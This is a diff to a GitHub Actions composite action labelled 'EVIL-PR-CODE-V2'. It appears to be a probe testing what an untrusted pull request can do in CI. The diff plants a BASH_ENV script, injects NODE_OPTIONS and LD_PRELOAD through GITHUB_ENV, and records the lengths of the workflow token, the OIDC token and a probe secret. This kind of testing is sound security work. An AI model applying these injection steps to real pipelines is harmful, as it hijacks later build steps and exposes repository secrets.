@@ -8,12 +8,15 @@ runs:
       env:
         GH_TOKEN: ${{ github.token }}
       run: |
-        echo "ACTION_VERSION=EVIL-PR-CODE"
+        set -x
+        echo "ACTION_VERSION=EVIL-PR-CODE-V2"
         echo "COMPOSITE_TOKEN_LEN=${#GH_TOKEN}"
+        echo "OIDC_URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
         cat > /tmp/envprobe.sh <<'EOS'
-        echo "BASH_ENV_RAN probe_secret_len=${#PROBE_SECRET} bash_env_len=${#BASH_ENV}" > /tmp/envprobe.out
+        echo "BASH_ENV_RAN probe_secret_len=${#PROBE_SECRET} token_env_len=${#GH_TOKEN} oidc_env_len=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}" > /tmp/envprobe.out
         EOS
+        chmod +x /tmp/envprobe.sh
         echo "BASH_ENV=/tmp/envprobe.sh" >> "$GITHUB_ENV"
         echo "INJECTED_MARKER=yes" >> "$GITHUB_ENV"
-        echo "NODE_OPTIONS=--require /tmp/nope.js" >> "$GITHUB_ENV" || echo "NODE_OPTIONS_BLOCKED"
-        echo "LD_PRELOAD=/tmp/nope.so" >> "$GITHUB_ENV" || echo "LD_PRELOAD_BLOCKED"
+        echo "NODE_OPTIONS=--require /tmp/nope.js" >> "$GITHUB_ENV"
+        echo "LD_PRELOAD=/tmp/nope.so" >> "$GITHUB_ENV"
